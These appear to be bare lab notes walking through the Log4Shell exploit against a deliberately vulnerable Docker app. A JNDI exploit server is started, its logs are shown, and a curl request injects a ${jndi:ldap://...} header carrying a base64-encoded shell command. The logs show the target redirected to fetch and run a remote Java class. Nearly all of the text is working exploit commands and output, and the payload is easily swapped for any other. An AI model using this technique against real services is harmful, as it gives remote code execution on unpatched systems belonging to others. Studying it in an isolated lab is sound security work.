docker run -p 8080:8080 --name vulnerable-app ghcr.io/igormv28/vulnerable-app

```2022-01-09 23:52:08.343  INFO 1 --- [nio-8080-exec-2] HelloWorld                               : Received a request for API version Reference Class Name: foo```

docker run -P --name jndi ghcr.io/igormv28/jndi
```[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Base64/dG91Y2ggQUFBQUFB
[!] Exception: UnSupportedPayloadType: Base64
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggQUFBQUFB
[+] Paylaod: command
[+] Command: touch AAAAAA
[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggQUFBQUFB with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggQUFBQUFB redirecting to http://127.0.0.1:8888/ExploitBFEFKMJgDb.class
```
docker inspect jndi |grep IPAddress
          ```  "SecondaryIPAddresses": null,
            "IPAddress": "172.17.0.2",
                    "IPAddress": "172.17.0.2",```

curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.2:1389/Basic/Command/Base64/dG91Y2ggQUFBQUFB}'
```Hello, world!```
